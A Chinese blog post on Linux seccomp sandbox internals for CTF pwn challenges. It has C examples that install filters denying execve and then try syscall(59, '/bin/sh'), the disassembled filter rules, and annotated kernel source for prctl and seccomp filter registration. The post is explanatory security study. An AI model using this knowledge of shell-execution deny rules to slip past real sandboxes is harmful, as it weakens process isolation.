            <a href="/2023/11/21/Principles%EF%BC%9A%E6%B2%99%E7%9B%92%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：沙盒底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-21 20:50:47" itemprop="dateCreated datePublished" datetime="2023-11-21T20:50:47+08:00">2023-11-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-23 12:11:22" itemprop="dateModified" datetime="2023-11-23T12:11:22+08:00">2023-11-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>30k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>28 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>沙盒基础知识</strong></p>
<p>在 CTF 的 pwn 题中一般有两种函数调用方式实现沙盒机制：</p>
<p>使用 <code>prctl</code> 系统调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/prctl.h&gt;</span>    </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/bpf.h&gt;</span>             </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[]=</span>&#123;</span><br><span class="line">        BPF_STMT(BPF_LD|BPF_W|BPF_ABS, <span class="number">0</span>),   </span><br><span class="line">        BPF_JUMP(BPF_JMP|BPF_JEQ, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>), </span><br><span class="line">        BPF_JUMP(BPF_JMP|BPF_JGE, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ERRNO),</span><br><span class="line">        BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span>=</span>&#123;</span><br><span class="line">        .len=<span class="keyword">sizeof</span>(filter)/<span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter=filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">    syscall(<span class="number">59</span>,<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0003</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x35</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt;= <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0004</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00050000</span>  <span class="keyword">return</span> ERRNO(<span class="number">0</span>)</span><br><span class="line"><span class="number">0004</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<p>使用 <code>seccomp</code> 库函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line">    syscall(<span class="number">59</span>,<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>对 <code>seccomp_load</code> 函数进行逆向分析，可以发现其底层也是使用 <code>prctl</code> 系统调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v17 = prctl(<span class="number">38LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>); <span class="comment">/* PR_SET_NO_NEW_PRIVS */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v14 = prctl(<span class="number">22LL</span>, <span class="number">2LL</span>, v10, v10, v7); <span class="comment">/* PR_SET_SECCOMP */</span></span><br></pre></td></tr></table></figure>
<p><strong>prctl 系统调用</strong></p>
<p><code>prctl</code>（Process Control Language，进程控制语言）是一个 Linux 系统调用的一个重要工具，它可以对进程进行各种管理和控制操作</p>
<p><code>prctl</code> 提供了对进程的许多控制和设置，使用第一个参数来指定其功能：</p>
<ul>
<li>设置进程的权限级别</li>
<li>设置进程的调度参数</li>
<li>设置进程的内存限制</li>
<li>设置进程的 CPU 时间限制</li>
<li>设置进程的信号处理</li>
<li>设置进程的资源限制</li>
<li>设置进程的属性</li>
<li>获取进程的属性</li>
</ul>
<p>沙盒需要的 <code>prctl</code> 功能如下：</p>
<ul>
<li><code>prctl(PR_SET_NO_NEW_PRIVS)</code>：命名空间内以 <code>CAP_SYS_ADMIN</code> 权限运行（子进程会保证不会赋予运行进程新的权限）</li>
<li><code>prctl(PR_SET_SECCOMP)</code>：第二个参数是设置的过滤模式，第三个参数是设置的过滤规则</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">	<span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">	error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">	<span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">		<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">	error = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">switch</span> (option) &#123;</span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">case</span> PR_SET_SECCOMP: </span><br><span class="line">		error = prctl_set_seccomp(arg2, (<span class="keyword">char</span> __user *)arg3);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">             </span><br><span class="line">	<span class="keyword">case</span> PR_SET_NO_NEW_PRIVS: </span><br><span class="line">		<span class="keyword">if</span> (arg2 != <span class="number">1</span> || arg3 || arg4 || arg5)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		task_set_no_new_privs(current);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		error = -EINVAL;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>核心函数 <code>prctl_set_seccomp</code> 的调用链如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">prctl_set_seccomp</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> seccomp_mode, <span class="keyword">void</span> __user *filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">	<span class="keyword">void</span> __user *uargs;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (seccomp_mode) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_STRICT: <span class="comment">/* 严格模式(所有的syscall都被检查和过滤) */</span></span><br><span class="line">		op = SECCOMP_SET_MODE_STRICT;</span><br><span class="line">		uargs = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_MODE_FILTER: <span class="comment">/* 过滤模式(所有的syscall都被允许,但是某些syscall可能会被过滤器拒绝) */</span></span><br><span class="line">		op = SECCOMP_SET_MODE_FILTER;</span><br><span class="line">		uargs = filter;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> do_seccomp(op, <span class="number">0</span>, uargs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">do_seccomp</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> op, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">		       <span class="keyword">void</span> __user *uargs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (op) &#123;</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_STRICT: <span class="comment">/* 严格模式 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span> || uargs != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_strict();</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_SET_MODE_FILTER: <span class="comment">/* 过滤模式 */</span></span><br><span class="line">		<span class="keyword">return</span> seccomp_set_mode_filter(flags, uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_ACTION_AVAIL: <span class="comment">/* 用于查询特定的action是否被内核支持 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_action_avail(uargs);</span><br><span class="line">	<span class="keyword">case</span> SECCOMP_GET_NOTIF_SIZES: <span class="comment">/* 获取指定进程的安全上下文通知大小 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> seccomp_get_notif_sizes(uargs);</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们重点分析过滤模式的 <code>seccomp_set_mode_filter</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">seccomp_set_mode_filter</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">const</span> <span class="keyword">char</span> __user *filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> seccomp_mode = SECCOMP_MODE_FILTER;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">prepared</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">long</span> ret = -EINVAL;</span><br><span class="line">	<span class="keyword">int</span> listener = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">listener_f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	prepared = seccomp_prepare_user_filter(filter); <span class="comment">/* 在持有锁之前准备新过滤器 */</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(prepared))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(prepared);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		listener = get_unused_fd_flags(O_CLOEXEC);</span><br><span class="line">		<span class="keyword">if</span> (listener &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			ret = listener;</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		listener_f = init_listener(prepared); <span class="comment">/* 初始化一个监听器,用于接收来自内核的通知和事件 */</span></span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(listener_f)) &#123;</span><br><span class="line">			put_unused_fd(listener);</span><br><span class="line">			ret = PTR_ERR(listener_f);</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC &amp;&amp;</span><br><span class="line">	    mutex_lock_killable(&amp;current-&gt;signal-&gt;cred_guard_mutex))</span><br><span class="line">		<span class="keyword">goto</span> out_put_fd;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!seccomp_may_assign_mode(seccomp_mode))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (has_duplicate_listener(prepared)) &#123; <span class="comment">/* 检查一个进程是否已经有一个监听器 */</span></span><br><span class="line">		ret = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = seccomp_attach_filter(flags, prepared); <span class="comment">/* 将一个过滤器附加到受限制的安全上下文中 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">/* Do not free the successfully attached filter. */</span></span><br><span class="line">	prepared = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	seccomp_assign_mode(current, seccomp_mode, flags); <span class="comment">/* 将一个受限制的安全上下文分配给一个进程(current当前进程) */</span></span><br><span class="line">out:</span><br><span class="line">	spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC)</span><br><span class="line">		mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">out_put_fd:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">			listener_f-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">			fput(listener_f); <span class="comment">/* 释放对文件的最后一个引用 */</span></span><br><span class="line">			put_unused_fd(listener); <span class="comment">/* 说明目标文件描述符已经不再使用 */</span></span><br><span class="line">			seccomp_notify_detach(prepared);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fd_install(listener, listener_f);</span><br><span class="line">			ret = listener;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">out_free:</span><br><span class="line">	seccomp_filter_free(prepared);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>其最核心的工作就是在 <code>current-&gt;seccomp.filter</code> 中注册过滤器：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filter-&gt;prev = current-&gt;seccomp.filter;</span><br><span class="line">current-&gt;seccomp.filter = filter;</span><br><span class="line">atomic_inc(&amp;current-&gt;seccomp.filter_count);</span><br></pre></td></tr></table></figure>
<p>如果使用了 FILTER 模式，则调用 <code>seccomp_run_filters</code> 函数来进行所有指令判断过滤，系统调用号作为参数传递，根据返回值来进行后续处理</p>
<p>这里我们分析一下从 syscall 入口函数 <code>entry_SYSCALL_compat</code> 到 <code>seccomp_run_filters</code> 的调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SYM_CODE_START(entry_SYSCALL_compat)</span><br><span class="line">	UNWIND_HINT_EMPTY</span><br><span class="line">	/* Interrupts are off on entry. */</span><br><span class="line">	swapgs</span><br><span class="line"></span><br><span class="line">	/* Stash user ESP */</span><br><span class="line">	movl	%esp, %r8d</span><br><span class="line"></span><br><span class="line">	/* Use %rsp as scratch reg. User ESP is stashed in r8 */</span><br><span class="line">	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp</span><br><span class="line">	......</span><br><span class="line">	movq	%rsp, %rdi</span><br><span class="line">	call	do_fast_syscall_32</span><br><span class="line">	......</span><br><span class="line">	SWITCH_TO_USER_CR3_NOSTACK scratch_reg=%r8 scratch_reg2=%r9</span><br><span class="line"></span><br><span class="line">	xorl	%r8d, %r8d</span><br><span class="line">	xorl	%r9d, %r9d</span><br><span class="line">	xorl	%r10d, %r10d</span><br><span class="line">	swapgs</span><br><span class="line">	sysretl</span><br><span class="line">SYM_CODE_END(entry_SYSCALL_compat)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinstr <span class="keyword">bool</span> __do_fast_syscall_32(struct pt_regs *regs)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr = syscall_32_enter(regs);</span><br><span class="line">	<span class="keyword">int</span> res;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* The case truncates any ptrace induced syscall nr &gt; 2^32 -1 */</span></span><br><span class="line">	nr = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)syscall_enter_from_user_mode_work(regs, nr);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now this is just like a normal syscall. */</span></span><br><span class="line">	do_syscall_32_irqs_on(regs, nr);</span><br><span class="line">	syscall_exit_to_user_mode(regs);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">syscall_enter_from_user_mode_work</span><span class="params">(struct pt_regs *regs, <span class="keyword">long</span> syscall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> __syscall_enter_from_user_work(regs, syscall);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
